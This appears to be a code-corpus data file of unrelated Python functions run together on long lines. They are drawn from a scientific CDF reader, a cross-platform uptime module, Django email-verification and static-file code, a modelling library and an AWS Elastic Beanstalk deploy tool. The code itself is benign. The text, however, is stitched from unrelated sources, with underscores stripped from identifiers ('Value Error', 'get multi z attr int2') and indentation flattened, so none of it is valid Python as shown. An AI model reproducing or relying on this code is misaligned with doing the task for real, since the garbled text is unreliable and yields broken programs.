) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'uint1' ] , fortran cdf . get multi z attr int1 , data offset = 256 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'int2' ] , fortran cdf . get multi z attr int2 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'uint2' ] , fortran cdf . get multi z attr int2 , data offset = 65536 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'int4' ] , fortran cdf . get multi z attr int4 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'uint4' ] , fortran cdf . get multi z attr int4 , data offset = 2 ** 32 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'char' ] , fortran cdf . get multi z attr char ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'uchar' ] , fortran cdf . get multi z attr char )
def process return multi z attr ( self , data , attr names , var names , sub num elems ) : # process data for i , ( attr name , var name , num e ) in enumerate ( zip ( attr names , var names , sub num elems ) ) : if var name not in self . meta . keys ( ) : self . meta [ var name ] = { } if num e == 1 : self . meta [ var name ] [ attr name ] = data [ i , 0 ] else : if data [ i ] . dtype == '|S1' : self . meta [ var name ] [ attr name ] = '' . join ( data [ i , 0 : num e ] . astype ( 'U' ) ) . rstrip ( ) else : self . meta [ var name ] [ attr name ] = data [ i , 0 : num e ]
def uptime linux ( ) : # With procfs try : f = open ( '/proc/uptime' , 'r' ) up = float ( f . readline ( ) . split ( ) [ 0 ] ) f . close ( ) return up except ( IO Error , Value Error ) : pass # Without procfs (really?) try : libc = ctypes . CDLL ( 'libc.so' ) except Attribute Error : return None except OS Error : # Debian and derivatives do the wrong thing because /usr/lib/libc.so # is a GNU ld script rather than an ELF object. To get around this, we # have to be more specific. # We don't want to use ctypes.util.find library because that creates a # new process on Linux. We also don't want to try too hard because at # this point we're already pretty sure this isn't Linux. try : libc = ctypes . CDLL ( 'libc.so.6' ) except OS Error : return None if not hasattr ( libc , 'sysinfo' ) : # Not Linux. return None buf = ctypes . create string buffer ( 128 ) # 64 suffices on 32-bit, whatever. if libc . sysinfo ( buf ) < 0 : return None up = struct . unpack from ( '@l' , buf . raw ) [ 0 ] if up < 0 : up = None return up
def boottime linux ( ) : global boottime try : f = open ( '/proc/stat' , 'r' ) for line in f : if line . startswith ( 'btime' ) : boottime = int ( line . split ( ) [ 1 ] ) if datetime is None : raise Not Implemented Error ( 'datetime module required.' ) return datetime . fromtimestamp ( boottime ) except ( IO Error , Index Error ) : return None
def uptime amiga ( ) : global boottime try : boottime = os . stat ( 'RAM:' ) . st ctime return time . time ( ) - boottime except ( Name Error , OS Error ) : return None
def uptime minix ( ) : try : f = open ( '/proc/uptime' , 'r' ) up = float ( f . read ( ) ) f . close ( ) return up except ( IO Error , Value Error ) : return None
def uptime plan9 ( ) : # Apparently Plan 9 only has Python 2.2, which I'm not prepared to # support. Maybe some Linuxes implement /dev/time, though, someone was # talking about it somewhere. try : # The time file holds one 32-bit number representing the sec- # onds since start of epoch and three 64-bit numbers, repre- # senting nanoseconds since start of epoch, clock ticks, and # clock frequency. #  -- cons(3) f = open ( '/dev/time' , 'r' ) s , ns , ct , cf = f . read ( ) . split ( ) f . close ( ) return float ( ct ) / float ( cf ) except ( IO Error , Value Error ) : return None
def uptime solaris ( ) : global boottime try : kstat = ctypes . CDLL ( 'libkstat.so' ) except ( Attribute Error , OS Error ) : return None # kstat doesn't have uptime, but it does have boot time. # Unfortunately, getting at it isn't perfectly straightforward. # First, let's pretend to be kstat.h # Constant KSTAT STRLEN = 31 # According to every kstat.h I could find. # Data structures class anon union ( ctypes . Union ) : # The ``value'' union in kstat named t actually has a bunch more # members, but we're only using it for boot time, so we only need # the padding and the one we're actually using. fields = [ ( 'c' , ctypes . c char * 16 ) , ( 'time' , ctypes . c int ) ] class kstat named t ( ctypes . Structure ) : fields = [ ( 'name' , ctypes . c char * KSTAT STRLEN ) , ( 'data type' , ctypes . c char ) , ( 'value' , anon union ) ] # Function signatures kstat . kstat open . restype = ctypes . c void p kstat . kstat lookup . restype = ctypes . c void p kstat . kstat lookup . argtypes = [ ctypes . c void p , ctypes . c char p , ctypes . c int , ctypes . c char p ] kstat . kstat read . restype = ctypes . c int kstat . kstat read . argtypes = [ ctypes . c void p , ctypes . c void p , ctypes . c void p ] kstat . kstat data lookup . restype = ctypes . POINTER ( kstat named t ) kstat . kstat data lookup . argtypes = [ ctypes . c void p , ctypes . c char p ] # Now, let's do something useful. # Initialise kstat control structure. kc = kstat . kstat open ( ) if not kc : return None # We're looking for unix:0:system misc:boot time. ksp = kstat . kstat lookup ( kc , 'unix' , 0 , 'system misc' ) if ksp and kstat . kstat read ( kc , ksp , None ) != - 1 : data = kstat . kstat data lookup ( ksp , 'boot time' ) if data : boottime = data . contents . value . time # Clean-up. kstat . kstat close ( kc ) if boottime is not None : return time . time ( ) - boottime return None
def uptime syllable ( ) : global boottime try : boottime = os . stat ( '/dev/pty/mst/pty0' ) . st mtime return time . time ( ) - boottime except ( Name Error , OS Error ) : return None
def uptime ( ) : if boottime is not None : return time . time ( ) - boottime return { 'amiga' : uptime amiga , 'aros12' : uptime amiga , 'beos5' : uptime beos , 'cygwin' : uptime linux , 'darwin' : uptime osx , 'haiku1' : uptime beos , 'linux' : uptime linux , 'linux-armv71' : uptime linux , 'linux2' : uptime linux , 'mac' : uptime mac , 'minix3' : uptime minix , 'riscos' : uptime riscos , 'sunos5' : uptime solaris , 'syllable' : uptime syllable , 'win32' : uptime windows , 'wince' : uptime windows } . get ( sys . platform , uptime bsd ) ( ) or uptime bsd ( ) or uptime plan9 ( ) or uptime linux ( ) or uptime windows ( ) or uptime solaris ( ) or uptime beos ( ) or uptime amiga ( ) or uptime riscos ( ) or uptime posix ( ) or uptime syllable ( ) or uptime mac ( ) or uptime osx ( )
def boottime ( ) : global boottime if boottime is None : up = uptime ( ) if up is None : return None if boottime is None : boottime linux ( ) if datetime is None : raise Runtime Error ( 'datetime module required.' ) return datetime . fromtimestamp ( boottime or time . time ( ) - up )
def initfile ( path , data = "dict" ) : data = { } if data . lower ( ) == "dict" else [ ] # The file will need to be created if it doesn't exist if not os . path . exists ( path ) : # The file doesn't exist # Raise exception if the directory that should contain the file doesn't # exist dirname = os . path . dirname ( path ) if dirname and not os . path . exists ( dirname ) : raise IO Error ( ( "Could not initialize empty JSON file in non-existant " "directory '{}'" ) . format ( os . path . dirname ( path ) ) ) # Write an empty file there with open ( path , "w" ) as f : json . dump ( data , f ) return True elif os . path . getsize ( path ) == 0 : # The file is empty with open ( path , "w" ) as f : json . dump ( data , f ) else : # The file exists and contains content return False
def is configured ( self , project , * * kwargs ) : params = self . get option return bool ( params ( 'server host' , project ) and params ( 'server port' , project ) )
def send confirmation ( self ) : confirmation = Email Confirmation . objects . create ( email = self ) confirmation . send ( )
def send duplicate notification ( self ) : email utils . send email ( from email = settings . DEFAULT FROM EMAIL , recipient list = [ self . email ] , subject = ( "Registration Attempt" ) , template name = "rest email auth/emails/duplicate-email" , ) logger . info ( "Sent duplicate email notification to: %s" , self . email )
def set primary ( self ) : query = Email Address . objects . filter ( is primary = True , user = self . user ) query = query . exclude ( pk = self . pk ) # The transaction is atomic so there is never a gap where a user # has no primary email address. with transaction . atomic ( ) : query . update ( is primary = False ) self . is primary = True self . save ( ) logger . info ( "Set %s as the primary email address for %s." , self . email , self . user , )
def confirm ( self ) : self . email . is verified = True self . email . save ( ) signals . email verified . send ( email = self . email , sender = self . class ) logger . info ( "Verified email address: %s" , self . email . email )
def send ( self ) : context = { "verification url" : app settings . EMAIL VERIFICATION URL . format ( key = self . key ) } email utils . send email ( context = context , from email = settings . DEFAULT FROM EMAIL , recipient list = [ self . email . email ] , subject = ( "Please Verify Your Email Address" ) , template name = "rest email auth/emails/verify-email" , ) logger . info ( "Sent confirmation email to %s for user #%d" , self . email . email , self . email . user . id , )
def save ( self ) : token = models . Password Reset Token . objects . get ( key = self . validated data [ "key" ] ) token . email . user . set password ( self . validated data [ "password" ] ) token . email . user . save ( ) logger . info ( "Reset password for %s" , token . email . user ) token . delete ( )
def create ( self , * args , * * kwargs ) : is primary = kwargs . pop ( "is primary" , False ) with transaction . atomic ( ) : email = super ( Email Address Manager , self ) . create ( * args , * * kwargs ) if is primary : email . set primary ( ) return email
def get queryset ( self ) : oldest = timezone . now ( ) - app settings . PASSWORD RESET EXPIRATION queryset = super ( Valid Password Reset Token Manager , self ) . get queryset ( ) return queryset . filter ( created at gt = oldest )
def handle ( self , * args , * * kwargs ) : cutoff = timezone . now ( ) cutoff -= app settings . CONFIRMATION EXPIRATION cutoff -= app settings . CONFIRMATION SAVE PERIOD queryset = models . Email Confirmation . objects . filter ( created at lte = cutoff ) count = queryset . count ( ) queryset . delete ( ) if count : self . stdout . write ( self . style . SUCCESS ( "Removed {count} old email confirmation(s)" . format ( count = count ) ) ) else : self . stdout . write ( "No email confirmations to remove." )
def get repr ( self , obj , referent = None ) : objtype = type ( obj ) typename = str ( objtype . module ) + "." + objtype . name prettytype = typename . replace ( " builtin ." , "" ) name = getattr ( obj , " name " , "" ) if name : prettytype = "%s %r" % ( prettytype , name ) key = "" if referent : key = self . get refkey ( obj , referent ) url = reverse ( 'dowser trace object' , args = ( typename , id ( obj ) ) ) return ( '<a class="objectid" href="%s">%s</a> ' '<span class="typename">%s</span>%s<br />' '<span class="repr">%s</span>' % ( url , id ( obj ) , prettytype , key , get repr ( obj , 100 ) ) )
def walk ( self , maxresults = 100 , maxdepth = None ) : log . debug ( "step" ) self . seen = { } self . ignore ( self , self . dict , self . obj , self . seen , self . ignore ) # Ignore the calling frame, its builtins, globals and locals self . ignore caller ( ) self . maxdepth = maxdepth count = 0 log . debug ( "will iterate results" ) for result in self . gen ( self . obj ) : log . debug ( "will yeld" ) yield result count += 1 if maxresults and count >= maxresults : yield 0 , 0 , "==== Max results reached ====" return
def print tree ( self , maxresults = 100 , maxdepth = None ) : self . ignore caller ( ) for depth , refid , rep in self . walk ( maxresults , maxdepth ) : print ( ( "%9d" % refid ) , ( " " * depth * 2 ) , rep )
def print tree ( self , maxresults = 100 , maxdepth = None ) : self . ignore caller ( ) for trail in self . walk ( maxresults , maxdepth ) : print ( trail ) if self . stops : print ( "%s paths stopped because max depth reached" % self . stops )
def list ( self , ignore patterns ) : for prefix , root in self . locations : storage = self . storages [ root ] for path in utils . get files ( storage , ignore patterns ) : yield path , storage
def list ( self , ignore patterns ) : for storage in six . itervalues ( self . storages ) : if storage . exists ( '' ) : # check if storage location exists for path in utils . get files ( storage , ignore patterns ) : yield path , storage
def find ( self , path , all = False ) : matches = [ ] for app in self . apps : app location = self . storages [ app ] . location if app location not in searched locations : searched locations . append ( app location ) match = self . find in app ( app , path ) if match : if not all : return match matches . append ( match ) return matches
def find in app ( self , app , path ) : storage = self . storages . get ( app , None ) if storage : # only try to find a file if the source dir actually exists if storage . exists ( path ) : matched path = storage . path ( path ) if matched path : return matched path
def set options ( self , * * options ) : self . interactive = options [ 'interactive' ] self . verbosity = options [ 'verbosity' ] self . symlink = options [ 'link' ] self . clear = options [ 'clear' ] self . dry run = options [ 'dry run' ] ignore patterns = options [ 'ignore patterns' ] if options [ 'use default ignore patterns' ] : ignore patterns += [ 'CVS' , '.*' , '*~' ] self . ignore patterns = list ( set ( ignore patterns ) ) self . post process = options [ 'post process' ]
def clear dir ( self , path ) : dirs , files = self . storage . listdir ( path ) for f in files : fpath = os . path . join ( path , f ) if self . dry run : self . log ( "Pretending to delete '%s'" % smart text ( fpath ) , level = 1 ) else : self . log ( "Deleting '%s'" % smart text ( fpath ) , level = 1 ) self . storage . delete ( fpath ) for d in dirs : self . clear dir ( os . path . join ( path , d ) )
def delete file ( self , path , prefixed path , source storage ) : if self . storage . exists ( prefixed path ) : try : # When was the target file modified last time? target last modified = self . storage . modified time ( prefixed path ) except ( OS Error , Not Implemented Error , Attribute Error ) : # The storage doesn't support ``modified time`` or failed pass else : try : # When was the source file modified last time? source last modified = source storage . modified time ( path ) except ( OS Error , Not Implemented Error , Attribute Error ) : pass else : # The full path of the target file if self . local : full path = self . storage . path ( prefixed path ) else : full path = None # Skip the file if the source file is younger # Avoid sub-second precision (see #14665, #19540) if ( target last modified . replace ( microsecond = 0 ) >= source last modified . replace ( microsecond = 0 ) ) : if not ( ( self . symlink and full path and not os . path . islink ( full path ) ) or ( not self . symlink and full path and os . path . islink ( full path ) ) ) : if prefixed path not in self . unmodified files : self . unmodified files . append ( prefixed path ) self . log ( "Skipping '%s' (not modified)" % path ) return False # Then delete the existing file if really needed if self . dry run : self . log ( "Pretending to delete '%s'" % path ) else : self . log ( "Deleting '%s'" % path ) self . storage . delete ( prefixed path ) return True
def link file ( self , path , prefixed path , source storage ) : # Skip this file if it was already copied earlier if prefixed path in self . symlinked files : return self . log ( "Skipping '%s' (already linked earlier)" % path ) # Delete the target file if needed or break if not self . delete file ( path , prefixed path , source storage ) : return # The full path of the source file source path = source storage . path ( path ) # Finally link the file if self . dry run : self . log ( "Pretending to link '%s'" % source path , level = 1 ) else : self . log ( "Linking '%s'" % source path , level = 1 ) full path = self . storage . path ( prefixed path ) try : os . makedirs ( os . path . dirname ( full path ) ) except OS Error : pass try : if os . path . lexists ( full path ) : os . unlink ( full path ) os . symlink ( source path , full path ) except Attribute Error : import platform raise Command Error ( "Symlinking is not supported by Python %s." % platform . python version ( ) ) except Not Implemented Error : import platform raise Command Error ( "Symlinking is not supported in this " "platform (%s)." % platform . platform ( ) ) except OS Error as e : raise Command Error ( e ) if prefixed path not in self . symlinked files : self . symlinked files . append ( prefixed path )
def copy file ( self , path , prefixed path , source storage ) : # Skip this file if it was already copied earlier if prefixed path in self . copied files : return self . log ( "Skipping '%s' (already copied earlier)" % path ) # Delete the target file if needed or break if not self . delete file ( path , prefixed path , source storage ) : return # The full path of the source file source path = source storage . path ( path ) # Finally start copying if self . dry run : self . log ( "Pretending to copy '%s'" % source path , level = 1 ) else : self . log ( "Copying '%s'" % source path , level = 1 ) with source storage . open ( path ) as source file : self . storage . save ( prefixed path , source file ) self . copied files . append ( prefixed path )
def baseattrs ( self ) : result = super ( ) . baseattrs result [ "spaces" ] = self . spaces . baseattrs return result
def restore state ( self , system ) : for space in self . spaces . values ( ) : space . restore state ( system )
def get node ( obj , args , kwargs ) : if args is None and kwargs is None : return ( obj , ) if kwargs is None : kwargs = { } return obj , bind args ( obj , args , kwargs )
def node get args ( node ) : obj = node [ OBJ ] key = node [ KEY ] boundargs = obj . formula . signature . bind ( * key ) boundargs . apply defaults ( ) return boundargs . arguments
def get object ( name : str ) : # TODO: Duplicate of system.get object elms = name . split ( "." ) parent = get models ( ) [ elms . pop ( 0 ) ] while len ( elms ) > 0 : obj = elms . pop ( 0 ) parent = getattr ( parent , obj ) return parent
def restore ipython ( self ) : if not self . is ipysetup : return shell class = type ( self . shell ) shell class . showtraceback = shell class . default showtraceback del shell class . default showtraceback self . is ipysetup = False
def restore python ( self ) : orig = self . orig settings sys . setrecursionlimit ( orig [ "sys.recursionlimit" ] ) if "sys.tracebacklimit" in orig : sys . tracebacklimit = orig [ "sys.tracebacklimit" ] else : if hasattr ( sys , "tracebacklimit" ) : del sys . tracebacklimit if "showwarning" in orig : warnings . showwarning = orig [ "showwarning" ] orig . clear ( ) threading . stack size ( )
def get object ( self , name ) : parts = name . split ( "." ) model name = parts . pop ( 0 ) return self . models [ model name ] . get object ( "." . join ( parts ) )
def get interfaces ( impls ) : if impls is None : return None elif isinstance ( impls , Order Mixin ) : result = Ordered Dict ( ) for name in impls . order : result [ name ] = impls [ name ] . interface return result elif isinstance ( impls , Mapping ) : return { name : impls [ name ] . interface for name in impls } elif isinstance ( impls , Sequence ) : return [ impl . interface for impl in impls ] else : return impls . interface
def get impls ( interfaces ) : if interfaces is None : return None elif isinstance ( interfaces , Mapping ) : return { name : interfaces [ name ] . impl for name in interfaces } elif isinstance ( interfaces , Sequence ) : return [ interfaces . impl for interfaces in interfaces ] else : return interfaces . impl
def baseattrs ( self ) : result = { "type" : type ( self ) . name , "id" : id ( self ) , "name" : self . name , "fullname" : self . fullname , "repr" : self . get repr ( ) , } return result
def baseattrs ( self ) : result = { "type" : type ( self ) . name } try : result [ "items" ] = { name : item . baseattrs for name , item in self . items ( ) if name [ 0 ] != " " } except : raise Runtime Error ( "%s literadict raised an error" % self ) return result
def convert args ( args , kwargs ) : found = False for arg in args : if isinstance ( arg , Cells ) : found = True break if found : args = tuple ( arg . value if isinstance ( arg , Cells ) else arg for arg in args ) if kwargs is not None : for key , arg in kwargs . items ( ) : if isinstance ( arg , Cells ) : kwargs [ key ] = arg . value return args , kwargs
def copy ( self , space = None , name = None ) : return Cells ( space = space , name = name , formula = self . formula )
def baseattrs ( self ) : result = super ( ) . baseattrs result [ "params" ] = ", " . join ( self . parameters ) return result
def value ( self ) : if self . has value : return self . impl [ OBJ ] . get value ( self . impl [ KEY ] ) else : raise Value Error ( "Value not found" )
def baseattrs ( self ) : result = { "type" : type ( self ) . name , "obj" : self . cells . baseattrs , "args" : self . args , "value" : self . value if self . has value else None , "predslen" : len ( self . preds ) , "succslen" : len ( self . succs ) , "repr parent" : self . cells . impl . repr parent ( ) , "repr" : self . cells . get repr ( ) , } return result
def move elements ( source , index to , index from , length ) : sublist = [ source . pop ( index from ) for in range ( length ) ] for in range ( length ) : source . insert ( index to , sublist . pop ( ) )
def get col index ( name ) : index = string . ascii uppercase . index col = 0 for c in name . upper ( ) : col = col * 26 + index ( c ) + 1 return col
def get range ( book , range , sheet ) : filename = None if isinstance ( book , str ) : filename = book book = opxl . load workbook ( book , data only = True ) elif isinstance ( book , opxl . Workbook ) : pass else : raise Type Error if is range address ( range ) : sheet names = [ name . upper ( ) for name in book . sheetnames ] index = sheet names . index ( sheet . upper ( ) ) data = book . worksheets [ index ] [ range ] else : data = get namedrange ( book , range , sheet ) if data is None : raise Value Error ( "Named range '%s' not found in %s" % ( range , filename or book ) ) return data
def find funcdef ( source ) : try : module node = compile ( source , "<string>" , mode = "exec" , flags = ast . Py CF ONLY AST ) except Syntax Error : return find funcdef ( fix lamdaline ( source ) ) for node in ast . walk ( module node ) : if isinstance ( node , ast . Function Def ) or isinstance ( node , ast . Lambda ) : return node raise Value Error ( "function definition not found" )
def extract params ( source ) : funcdef = find funcdef ( source ) params = [ ] for node in ast . walk ( funcdef . args ) : if isinstance ( node , ast . arg ) : if node . arg not in params : params . append ( node . arg ) return params
def is funcdef ( src ) : module node = ast . parse ( dedent ( src ) ) if len ( module node . body ) == 1 and isinstance ( module node . body [ 0 ] , ast . Function Def ) : return True else : return False
def remove decorator ( source : str ) : lines = source . splitlines ( ) atok = asttokens . AST Tokens ( source , parse = True ) for node in ast . walk ( atok . tree ) : if isinstance ( node , ast . Function Def ) : break if node . decorator list : deco first = node . decorator list [ 0 ] deco last = node . decorator list [ - 1 ] line first = atok . tokens [ deco first . first token . index - 1 ] . start [ 0 ] line last = atok . tokens [ deco last . last token . index + 1 ] . start [ 0 ] lines = lines [ : line first - 1 ] + lines [ line last : ] return "\n" . join ( lines ) + "\n"
def has lambda ( src ) : module node = ast . parse ( dedent ( src ) ) lambdaexp = [ node for node in ast . walk ( module node ) if isinstance ( node , ast . Lambda ) ] return bool ( lambdaexp )
def get description ( ) : with open ( path . join ( here , 'README.rst' ) , 'r' ) as f : data = f . read ( ) return data
def baseattrs ( self ) : result = super ( ) . baseattrs result [ "static spaces" ] = self . static spaces . baseattrs result [ "dynamic spaces" ] = self . dynamic spaces . baseattrs result [ "cells" ] = self . cells . baseattrs result [ "refs" ] = self . refs . baseattrs if self . has params ( ) : result [ "params" ] = ", " . join ( self . parameters ) else : result [ "params" ] = "" return result
def import funcs ( self , module ) : # Outside formulas only newcells = self . impl . new cells from module ( module ) return get interfaces ( newcells )
def get object ( self , name ) : parts = name . split ( "." ) child = parts . pop ( 0 ) if parts : return self . spaces [ child ] . get object ( "." . join ( parts ) ) else : return self . namespace impl [ child ]
def new dynspace ( self , name = None , bases = None , formula = None , refs = None , arguments = None , source = None , ) : if name is None : name = self . spacenamer . get next ( self . namespace ) if name in self . namespace : raise Value Error ( "Name '%s' already exists." % name ) if not is valid name ( name ) : raise Value Error ( "Invalid name '%s'." % name ) space = Root Dynamic Space Impl ( parent = self , name = name , formula = formula , refs = refs , source = source , arguments = arguments , ) space . is derived = False self . set space ( space ) if bases : # i.e. not [] dynbase = self . get dynamic base ( bases ) space . dynbase = dynbase dynbase . dynamic subs . append ( space ) return space
def restore state ( self , system ) : super ( ) . restore state ( system ) Base Space Container Impl . restore state ( self , system ) for cells in self . cells . values ( ) : cells . restore state ( system )
def del space ( self , name ) : if name not in self . spaces : raise Value Error ( "Space '%s' does not exist" % name ) if name in self . static spaces : space = self . static spaces [ name ] if space . is derived : raise Value Error ( "%s has derived spaces" % repr ( space . interface ) ) else : self . static spaces . del item ( name ) self . model . spacegraph . remove node ( space ) self . inherit ( ) self . model . spacegraph . update subspaces ( self ) # TODO: Destroy space elif name in self . dynamic spaces : # TODO: Destroy space self . dynamic spaces . del item ( name ) else : raise Value Error ( "Derived cells cannot be deleted" )
def clear obj ( self , obj ) : obj nodes = self . get nodes with ( obj ) removed = set ( ) for node in obj nodes : if self . has node ( node ) : removed . update ( self . clear descendants ( node ) ) return removed
def get nodes with ( self , obj ) : result = set ( ) if nx . version [ 0 ] == "1" : nodes = self . nodes iter ( ) else : nodes = self . nodes for node in nodes : if node [ OBJ ] == obj : result . add ( node ) return result
def add path ( self , nodes , * * attr ) : if nx . version [ 0 ] == "1" : return super ( ) . add path ( nodes , * * attr ) else : return nx . add path ( self , nodes , * * attr )
def rename ( self , name ) : self . impl . system . rename model ( new name = name , old name = self . name )
def rename ( self , name ) : if is valid name ( name ) : if name not in self . system . models : self . name = name return True # Rename success else : # Model name already exists return False else : raise Value Error ( "Invalid name '%s'." % name )
def clear descendants ( self , source , clear source = True ) : removed = self . cellgraph . clear descendants ( source , clear source ) for node in removed : del node [ OBJ ] . data [ node [ KEY ] ]
def clear obj ( self , obj ) : removed = self . cellgraph . clear obj ( obj ) for node in removed : del node [ OBJ ] . data [ node [ KEY ] ]
def get object ( self , name ) : parts = name . split ( "." ) space = self . spaces [ parts . pop ( 0 ) ] if parts : return space . get object ( "." . join ( parts ) ) else : return space
def restore state ( self , system ) : Impl . restore state ( self , system ) Base Space Container Impl . restore state ( self , system ) mapping = { } for node in self . cellgraph : if isinstance ( node , tuple ) : name , key = node else : name , key = node , None cells = self . get object ( name ) mapping [ node ] = get node ( cells , key , None ) self . cellgraph = nx . relabel nodes ( self . cellgraph , mapping )
def get dynamic base ( self , bases : tuple ) : try : return self . dynamic bases inverse [ bases ] except Key Error : name = self . dynamic base namer . get next ( self . dynamic bases ) base = self . new space ( name = name ) self . spacegraph . add space ( base ) self . dynamic bases [ name ] = base self . dynamic bases inverse [ bases ] = base base . add bases ( bases ) return base
def check mro ( self , bases ) : try : self . add node ( "temp" ) for base in bases : nx . Di Graph . add edge ( self , base , "temp" ) result = self . get mro ( "temp" ) [ 1 : ] finally : self . remove node ( "temp" ) return result
def get command names ( ) : ret = [ ] for f in os . listdir ( COMMAND MODULE PATH ) : if os . path . isfile ( os . path . join ( COMMAND MODULE PATH , f ) ) and f . endswith ( COMMAND MODULE SUFFIX ) : ret . append ( f [ : - len ( COMMAND MODULE SUFFIX ) ] ) return ret
def get ( vals , key , default val = None ) : val = vals for part in key . split ( '.' ) : if isinstance ( val , dict ) : val = val . get ( part , None ) if val is None : return default val else : return default val return val
def parse option settings ( option settings ) : ret = [ ] for namespace , params in list ( option settings . items ( ) ) : for key , value in list ( params . items ( ) ) : ret . append ( ( namespace , key , value ) ) return ret
def parse env config ( config , env name ) : all env = get ( config , 'app.all environments' , { } ) env = get ( config , 'app.environments.' + str ( env name ) , { } ) return merge dict ( all env , env )
def add config files to archive ( directory , filename , config = { } ) : with zipfile . Zip File ( filename , 'a' ) as zip file : for conf in config : for conf , tree in list ( conf . items ( ) ) : if 'yaml' in tree : content = yaml . dump ( tree [ 'yaml' ] , default flow style = False ) else : content = tree . get ( 'content' , '' ) out ( "Adding file " + str ( conf ) + " to archive " + str ( filename ) ) file entry = zipfile . Zip Info ( conf ) file entry . external attr = tree . get ( 'permissions' , 0o644 ) << 16 zip file . writestr ( file entry , content ) return filename
def swap environment cnames ( self , from env name , to env name ) : self . ebs . swap environment cnames ( source environment name = from env name , destination environment name = to env name )
def upload archive ( self , filename , key , auto create bucket = True ) : try : bucket = self . s3 . get bucket ( self . aws . bucket ) if ( ( self . aws . region != 'us-east-1' and self . aws . region != 'eu-west-1' ) and bucket . get location ( ) != self . aws . region ) or ( self . aws . region == 'us-east-1' and bucket . get location ( ) != '' ) or ( self . aws . region == 'eu-west-1' and bucket . get location ( ) != 'eu-west-1' ) : raise Exception ( "Existing bucket doesn't match region" ) except S3Response Error : bucket = self . s3 . create bucket ( self . aws . bucket , location = self . aws . region ) def report upload progress ( sent , total ) : if not sent : sent = 0 if not total : total = 0 out ( "Uploaded " + str ( sent ) + " bytes of " + str ( total ) + " (" + str ( int ( float ( max ( 1 , sent ) ) / float ( total ) * 100 ) ) + "%)" ) # upload the new version k = Key ( bucket ) k . key = self . aws . bucket path + key k . set metadata ( 'time' , str ( time ( ) ) ) k . set contents from filename ( filename , cb = report upload progress , num cb = 10 )
def application exists ( self ) : response = self . ebs . describe applications ( application names = [ self . app name ] ) return len ( response [ 'Describe Applications Response' ] [ 'Describe Applications Result' ] [ 'Applications' ] ) > 0
def create environment ( self , env name , version label = None , solution stack name = None , cname prefix = None , description = None , option settings = None , tier name = 'Web Server' , tier type = 'Standard' , tier version = '1.1' ) : out ( "Creating environment: " + str ( env name ) + ", tier name:" + str ( tier name ) + ", tier type:" + str ( tier type ) ) self . ebs . create environment ( self . app name , env name , version label = version label , solution stack name = solution stack name , cname prefix = cname prefix , description = description , option settings = option settings , tier type = tier type , tier name = tier name , tier version = tier version )
def environment exists ( self , env name ) : response = self . ebs . describe environments ( application name = self . app name , environment names = [ env name ] , include deleted = False ) return len ( response [ 'Describe Environments Response' ] [ 'Describe Environments Result' ] [ 'Environments' ] ) > 0 and response [ 'Describe Environments Response' ] [ 'Describe Environments Result' ] [ 'Environments' ] [ 0 ] [ 'Status' ] != 'Terminated'
def update environment ( self , environment name , description = None , option settings = [ ] , tier type = None , tier name = None , tier version = '1.0' ) : out ( "Updating environment: " + str ( environment name ) ) messages = self . ebs . validate configuration settings ( self . app name , option settings , environment name = environment name ) messages = messages [ 'Validate Configuration Settings Response' ] [ 'Validate Configuration Settings Result' ] [ 'Messages' ] ok = True for message in messages : if message [ 'Severity' ] == 'error' : ok = False out ( "[" + message [ 'Severity' ] + "] " + str ( environment name ) + " - '" + message [ 'Namespace' ] + ":" + message [ 'Option Name' ] + "': " + message [ 'Message' ] ) self . ebs . update environment ( environment name = environment name , description = description , option settings = option settings , tier type = tier type , tier name = tier name , tier version = tier version )
def environment name for cname ( self , env cname ) : envs = self . get environments ( ) for env in envs : if env [ 'Status' ] != 'Terminated' and 'CNAME' in env and env [ 'CNAME' ] and env [ 'CNAME' ] . lower ( ) . startswith ( env cname . lower ( ) + '.' ) : return env [ 'Environment Name' ] return None
def deploy version ( self , environment name , version label ) : out ( "Deploying " + str ( version label ) + " to " + str ( environment name ) ) self . ebs . update environment ( environment name = environment name , version label = version label )
def get versions ( self ) : response = self . ebs . describe application versions ( application name = self . app name ) return response [ 'Describe Application Versions Response' ] [ 'Describe Application Versions Result' ] [ 'Application Versions' ]
def create application version ( self , version label , key ) : out ( "Creating application version " + str ( version label ) + " for " + str ( key ) ) self . ebs . create application version ( self . app name , version label , s3 bucket = self . aws . bucket , s3 key = self . aws . bucket path + key )
def describe events ( self , environment name , next token = None , start time = None ) : events = self . ebs . describe events ( application name = self . app name , environment name = environment name , next token = next token , start time = start time + 'Z' ) return ( events [ 'Describe Events Response' ] [ 'Describe Events Result' ] [ 'Events' ] , events [ 'Describe Events Response' ] [ 'Describe Events Result' ] [ 'Next Token' ] )
def add arguments ( parser ) : parser . add argument ( '-o' , '--old-environment' , help = 'Old environment name' , required = True ) parser . add argument ( '-n' , '--new-environment' , help = 'New environment name' , required = True )
def execute ( helper , config , args ) : env = parse env config ( config , args . environment ) option settings = env . get ( 'option settings' , { } ) settings = parse option settings ( option settings ) for setting in settings : out ( str ( setting ) )
def execute ( helper , config , args ) : version label = args . version label env config = parse env config ( config , args . environment ) env name = args . environment # upload or build an archive version label = upload application archive ( helper , env config , archive = args . archive , directory = args . directory , version label = version label ) import datetime start time = datetime . datetime . utcnow ( ) . isoformat ( ) + 'Z' # deploy it helper . deploy version ( env name , version label ) # wait if not args . dont wait : helper . wait for environments ( env name , status = 'Ready' , version label = version label , include deleted = False ) # update it env = parse env config ( config , env name ) option settings = parse option settings ( env . get ( 'option settings' , { } ) ) helper . update environment ( env name , description = env . get ( 'description' , None ) , option settings = option settings , tier type = env . get ( 'tier type' ) , tier name = env . get ( 'tier name' ) , tier version = env . get ( 'tier version' ) ) # wait if not args . dont wait : helper . wait for environments ( env name , health = 'Green' , status = 'Ready' , version label = version label , include deleted = False ) events = helper . ebs . describe events ( start time = start time , environment name = env name ) import json if args . log events to file : with open ( 'ebs events.json' , 'w+' ) as f : json . dump ( events , f ) # delete unused helper . delete unused versions ( versions to keep = int ( get ( config , 'app.versions to keep' , 10 ) ) )
